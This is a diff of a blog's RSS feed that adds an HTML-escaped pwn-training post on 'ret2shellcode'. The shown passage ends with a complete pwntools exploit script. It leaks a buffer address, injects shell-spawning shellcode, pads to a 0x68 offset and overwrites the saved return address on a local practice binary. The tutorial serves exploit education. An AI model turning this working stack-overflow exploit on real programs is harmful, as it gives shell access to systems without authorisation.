+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Then communicate with the program by going interactive.&lt;/p&gt;
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;And BOOM! you have a shell.&lt;/p&gt;
+
+&lt;h2 id=&quot;final-exploit&quot;&gt;Final Exploit&lt;/h2&gt;
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;REMOTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'localhost'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./ret2shellcode'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;### Exploit Goes here ###
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;buf_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcraft&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;linux&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# store the shellcode
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Add junk until we reach saved RIP
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Overwrite RIP with buf's address
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# sendline because gets waits until a newline(\n)
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;If any of you have any questions/doubts, you can reach out to me on discord (stdnoerr#7880) or on twitter (@stdnoerr).&lt;/p&gt;
 </description>
-				<pubDate>Thu, 10 Jun 2021 13:52:00 +0500</pubDate>
-				<link>/basics/2021/06/10/basics-of-assembly.html</link>
-				<guid isPermaLink="true">/basics/2021/06/10/basics-of-assembly.html</guid>
+				<pubDate>Sat, 12 Jun 2021 20:05:00 +0500</pubDate>
+				<link>/pwn-training/2021/06/12/ret2shellcode.html</link>
+				<guid isPermaLink="true">/pwn-training/2021/06/12/ret2shellcode.html</guid>
 			</item>
 		
 	</channel>
